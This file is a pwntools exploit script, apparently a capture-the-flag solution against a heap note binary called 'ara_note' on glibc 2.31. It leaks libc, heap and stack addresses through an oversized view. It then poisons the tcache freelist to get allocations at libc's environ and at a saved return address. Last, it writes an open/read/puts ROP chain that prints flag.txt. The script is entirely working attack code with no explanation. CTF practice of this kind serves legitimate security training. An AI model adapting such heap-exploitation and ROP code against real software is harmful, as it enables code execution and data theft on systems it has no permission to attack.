from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
p = process("./ara_note", env={"LD_PRELOAD": libc.path})
context.arch = 'amd64'

def alloc(idx, size):
  p.sendlineafter("> ", "1")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("chunk: ", str(size))

def free(idx):
  p.sendlineafter("> ", "2")
  p.sendlineafter("index: ", str(idx))

def view(idx, size):
  p.sendlineafter("> ", "3")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("view: ", str(size))

def edit(idx, size, data):
  p.sendlineafter("> ", "4")
  p.sendlineafter("index: ", str(idx))
  p.sendlineafter("edit: ", str(size))
  p.sendlineafter("Data : ", data)

alloc(0, 0x80)
alloc(1, 0x508)
alloc(2, 0x410)

free(1)
view(0, 0x90 + 0x8)
libc_leak = u64(p.recvline()[144:-42].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x1ebbe0
log.info("Libc base: {}".format(hex(libc_base)))
libc_puts = libc_base + 0x0875a0
log.info("Libc puts: {}".format(hex(libc_puts)))
libc_environ = libc_base + 0x00000000001ef2e0
log.info("Libc environ: {}".format(hex(libc_environ)))
libc_read = libc_base + 0x111130
log.info("Libc read: {}".format(hex(libc_read)))
pop_rdi = libc_base + 0x0000000000026b72
log.info("Pop rdi: {}".format(hex(pop_rdi)))
pop_rsi = libc_base + 0x0000000000027529
log.info("Pop rsi: {}".format(hex(pop_rsi)))
pop_rdx_rbx = libc_base + 0x0000000000162866
log.info("Pop rdx rbx: {}".format(hex(pop_rdx_rbx)))
pop_rax = libc_base + 0x000000000004a550
log.info("Pop rax: {}".format(hex(pop_rax)))
syscall = libc_base + 0x000000000004b460
log.info("Syscall: {}".format(hex(syscall)))
pop_rcx = libc_base + 0x000000000009f822
log.info("Pop rcx: {}".format(hex(pop_rcx)))

for i in range(4,11): alloc(i, 0x100)
alloc(13, 0x20)
for i in range(10, 3, -1): free(i)

view(0, 0xa8)
heap_leak = u64(p.recvline()[160:-44].ljust(8, '\x00'))
log.info("Heap leak: {}".format(hex(heap_leak)))
heap_base = heap_leak - 0x320
log.info("Heap base: {}".format(hex(heap_base)))

alloc(4, 0x100)
edit(4, 0x118, 'A' * 0x100 + p64(0) + p64(0x111) + p64(libc_environ))
alloc(5, 0x100)
alloc(6, 0x100)
view(6, 0x8)

stack_leak = u64(p.recvline()[:-42].ljust(8, '\x00'))
log.info("Stack leak: {}".format(hex(stack_leak)))
ret_addr = stack_leak - 0x140
log.info("Ret address: {}".format(hex(ret_addr)))

free(4)
free(5)

edit(0, 0xa8, 'B' * 0x80 + p64(0) + p64(0x51) + p64(ret_addr))
alloc(4, 0x100)
edit(4, 0x10, './flag.txt\x00')
alloc(5, 0x100)
alloc(7, 0x100)

flag_loc = heap_base + 0x440
log.info("Flag loc: {}".format(hex(flag_loc)))

payload = ''
payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0) * 2
payload += p64(pop_rcx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(flag_loc)
payload += p64(pop_rdx_rbx)
payload += p64(0x100) * 2
payload += p64(libc_read)

payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(libc_puts)

print hex(len(payload))

edit(7, 0x100, payload)

p.interactive()